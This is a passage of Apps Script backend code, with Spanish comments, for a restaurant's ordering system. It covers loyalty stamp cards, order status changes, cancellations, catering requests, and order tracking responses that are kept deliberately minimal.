  let brownieUsado = t.brownieUsado;
  let pizzaUsada = t.pizzaUsada;
  let ciclos = t.ciclos;
  let brownieGuardado = t.brownieGuardado;

  /* Un sello por dia, contado el dia en que se ENTREGA. ultimoDia solo se
     mueve cuando de verdad se gano: si no, un pedido de agua en la manana
     marcaria el dia y la pizza de la noche ya no contaria. */
  const nuevoDia = ganaSello && t.ultimoDia !== hoy;
  if (nuevoDia) dias += 1;

  if (premioTipo === 'tarjeta:brownie') {
    // Se gasta primero el brownie heredado, y si no hay, el de esta tarjeta.
    if (brownieGuardado) brownieGuardado = false;
    else brownieUsado = true;
  }
  if (premioTipo === 'tarjeta:pizza') {
    /* La tarjeta se cierra. Un brownie que quedo sin reclamar NO se pierde:
       pasa a la siguiente. Ya se promete que los dias extra se conservan, y
       seria incoherente que el premio si se evaporara. */
    if (!brownieUsado) brownieGuardado = true;
    dias = Math.max(0, dias - PREMIOS.pizza.dia);
    brownieUsado = false;
    pizzaUsada = false;
    ciclos += 1;
  }

  if (t.fila) {
    sh.getRange(t.fila, c.indexOf('dias_ciclo') + 1).setValue(dias);
    if (nuevoDia) sh.getRange(t.fila, c.indexOf('ultimo_dia') + 1).setValue(hoy);
    sh.getRange(t.fila, c.indexOf('brownie_usado') + 1).setValue(brownieUsado);
    sh.getRange(t.fila, c.indexOf('pizza_usada') + 1).setValue(pizzaUsada);
    sh.getRange(t.fila, c.indexOf('ciclos') + 1).setValue(ciclos);
    sh.getRange(t.fila, c.indexOf('brownie_guardado') + 1).setValue(brownieGuardado);
  }
  return premiosDe_({ dias: dias, brownieUsado: brownieUsado, pizzaUsada: pizzaUsada, ciclos: ciclos, brownieGuardado: brownieGuardado });
}

function upsertCliente_(cliente, direccion, colonia) {
  if (!cliente || !cliente.telefono) return;
  const sh = sheet_(SHEETS.clientes);
  const data = sh.getDataRange().getValues();
  for (let r = 1; r < data.length; r++) {
    if (String(data[r][0]) === String(cliente.telefono)) {
      sh.getRange(r + 1, 6).setValue((Number(data[r][5]) || 0) + 1); // pedidos++
      return;
    }
  }
  sh.appendRow([textoSeguro_(cliente.telefono), textoSeguro_(cliente.nombre), textoSeguro_(direccion), textoSeguro_(colonia), '', 1]);
}

/** body: { token, folio } — avanza al siguiente estado del flujo. */
function avanzarEstado_(body) {

  const sh = sheet_(SHEETS.ordenes);
  const { row, index } = findOrdenRow_(sh, body.folio);
  const estadoActual = row[ORDENES_HEADERS.indexOf('estado')];
  const FLUJO = flujoDe_(row[ORDENES_HEADERS.indexOf('entrega_tipo')]);
  const k = FLUJO.indexOf(estadoActual);
  if (k === -1 || k >= FLUJO.length - 1) throw new Error('La orden ya está en el último estado');
  const nuevo = FLUJO[k + 1];

  sh.getRange(index, ORDENES_HEADERS.indexOf('estado') + 1).setValue(nuevo);
  const tsCol = TS_POR_ESTADO[nuevo];
  if (tsCol) sh.getRange(index, ORDENES_HEADERS.indexOf(tsCol) + 1).setValue(new Date());
  /* Aqui, y solo aqui, se sella la tarjeta. Un pedido cancelado o que se quedo
     a medias no cuenta, que es justo lo que se pedia. */
  if (nuevo === 'entregada' && row[ORDENES_HEADERS.indexOf('sello')] === 'pendiente') {
    liquidarPedido_(
      row[ORDENES_HEADERS.indexOf('cliente_telefono')],
      String(row[ORDENES_HEADERS.indexOf('premio')] || ''),
      new Date(), true);
    sh.getRange(index, ORDENES_HEADERS.indexOf('sello') + 1).setValue('contado');
  }

  if (nuevo === 'entregada') {
    const pagoMetodo = row[ORDENES_HEADERS.indexOf('pago_metodo')];
    if (pagoMetodo === 'Efectivo' || pagoMetodo === 'Terminal') {
      sh.getRange(index, ORDENES_HEADERS.indexOf('pago_estado') + 1).setValue('pagado');
    }
  }
  return { folio: body.folio, estado: nuevo };
}

/** body: { token, folio, motivo } */
function cancelarOrden_(body) {
  const sh = sheet_(SHEETS.ordenes);
  const { index } = findOrdenRow_(sh, body.folio);
  sh.getRange(index, ORDENES_HEADERS.indexOf('estado') + 1).setValue('cancelada');
  sh.getRange(index, ORDENES_HEADERS.indexOf('motivo_cancelacion') + 1).setValue(textoSeguro_(body.motivo));
  /* El sello queda anulado y el premio se libera solo: como la tarjeta nunca se
     toco al pedir, no hay nada que devolver — basta con que este pedido deje de
     estar 'pendiente' para que premiosReservados_ lo suelte. */
  sh.getRange(index, ORDENES_HEADERS.indexOf('sello') + 1).setValue('no');
  return { folio: body.folio, estado: 'cancelada' };
}

/** body: { token, nombre, telefono, personas, fecha_evento, notas } */
function crearSolicitudCatering_(body) {
  const sh = sheet_(SHEETS.catering);
  const folio = 'CAT-' + String(sh.getLastRow()).padStart(4, '0');
  sh.appendRow([folio, textoSeguro_(body.nombre), textoSeguro_(body.telefono), textoSeguro_(body.personas), textoSeguro_(body.fecha_evento), textoSeguro_(body.notas), 'nueva', new Date()]);
  return { folio };
}

function findOrdenRow_(sh, folio) {
  const data = sh.getDataRange().getValues();
  const folioCol = ORDENES_HEADERS.indexOf('folio');
  for (let r = 1; r < data.length; r++) {
    if (data[r][folioCol] === folio) return { row: data[r], index: r + 1 };
  }
  throw new Error('Folio no encontrado: ' + folio);
}

/** Arma las órdenes abiertas (no entregadas ni canceladas) con sus líneas, para el Centro de Ventas. */
/** Estado de UNA orden, para la pantalla de seguimiento del cliente en la app.
 *  Devuelve sólo el avance del pedido — nunca nombre, teléfono ni dirección:
 *  el token vive en el cliente, así que este endpoint no debe poder usarse para
 *  extraer datos personales de las órdenes de nadie. */
function estadoOrden_(folio) {
  if (!folio) throw new Error('Falta folio');
  var o = rowsAsObjects_(sheet_(SHEETS.ordenes)).find(function (x) { return String(x.folio) === String(folio); });
  if (!o) return null;
  return formaEstado_(o);
}

/* Forma publica del estado de un pedido. Deliberadamente minima: ni nombre, ni
 * telefono, ni direccion, ni total, ni lo que se pidio. Solo el avance, que es
 * lo unico que la pantalla de seguimiento necesita mostrar. */
function formaEstado_(o) {
  return {
    folio: o.folio,
    estado: o.estado,
    t_recibida: o.t_recibida,
    t_confirmada: o.t_confirmada,
    t_horno: o.t_horno,
    t_lista: o.t_lista,
    t_camino: o.t_camino,
    t_entregada: o.t_entregada,
    motivo_cancelacion: o.motivo_cancelacion || "",
    // Para que el seguimiento no ofrezca un 'en camino' que nunca va a pasar.
    pickup: o.entrega_tipo === 'pickup'
  };
}

/* Ultimo pedido de un telefono, para que el cliente recupere su seguimiento
 * desde otro dispositivo, o si pidio por WhatsApp y nunca tuvo el folio.
 * Devuelve la misma forma minima: quien teclee numeros al azar solo puede
 * enterarse de si ese telefono tiene un pedido en curso, nunca de quien es,
 * donde vive, ni cuanto gasto. */
function estadoPorTelefono_(telefono) {
  var tel = String(telefono || "").replace(/[^0-9]/g, "");
  if (tel.length !== 10) throw new Error("Telefono invalido");
  var ordenes = rowsAsObjects_(sheet_(SHEETS.ordenes)).filter(function (o) {
    return o.folio && String(o.cliente_telefono || "").replace(/[^0-9]/g, "") === tel;
  });
  if (!ordenes.length) return null;
  ordenes.sort(function (a, b) { return new Date(b.t_recibida) - new Date(a.t_recibida); });
  return formaEstado_(ordenes[0]);
}
function listarAbiertas_() {
  const ordenes = rowsAsObjects_(sheet_(SHEETS.ordenes)).filter(o => o.estado && o.estado !== 'entregada' && o.estado !== 'cancelada');
  return armarOrdenes_(ordenes);
}

/** Arma TODAS las órdenes de hoy (cualquier estado), para el corte del día y las pestañas
 *  de Entregadas/Canceladas del Centro de Ventas. */
function listarHoy_() {
  const hoy = new Date();
  hoy.setHours(0, 0, 0, 0);
  const ordenes = rowsAsObjects_(sheet_(SHEETS.ordenes)).filter(o => {
    if (!o.folio || !o.t_recibida) return false;
    const t = new Date(o.t_recibida);
    return t >= hoy;
  });
  return armarOrdenes_(ordenes);
}

function armarOrdenes_(ordenes) {
  const items = rowsAsObjects_(sheet_(SHEETS.ordenItems));
  const addons = rowsAsObjects_(sheet_(SHEETS.itemComplementos));

  return ordenes.map(o => {
    const lineas = items.filter(it => it.folio === o.folio).map(it => ({
      cant: it.cantidad,
      nombre: it.producto_nombre,
      importe: it.importe,
      addons: addons.filter(a => a.linea_id === it.linea_id).map(a => a.complemento_nombre)
    }));
    const minTranscurridos = o.t_recibida ? Math.floor((Date.now() - new Date(o.t_recibida).getTime()) / 60000) : 0;
    return {
      folio: o.folio, canal: o.canal, estado: o.estado,
      cliente: o.cliente_nombre,
      /* En un pedido para recoger no hay direccion. Si el destino se quedara en
         blanco, en la cocina se veria como un pedido a domicilio incompleto y
         se saldria un repartidor a ningun lado. */
      pickup: o.entrega_tipo === 'pickup',
      // En pickup no hay destino: lo dice el distintivo de arriba, no un texto
      // que se leeria como una direccion incompleta.
      destino: o.entrega_tipo === 'pickup'
        ? ''
        : o.direccion + (o.colonia ? ' · ' + o.colonia : ''),
      pago: o.pago_metodo, pagado: o.pago_estado === 'pagado',
      total: o.total, min: minTranscurridos, notas: o.notas || '', lineas
    };
  });
}
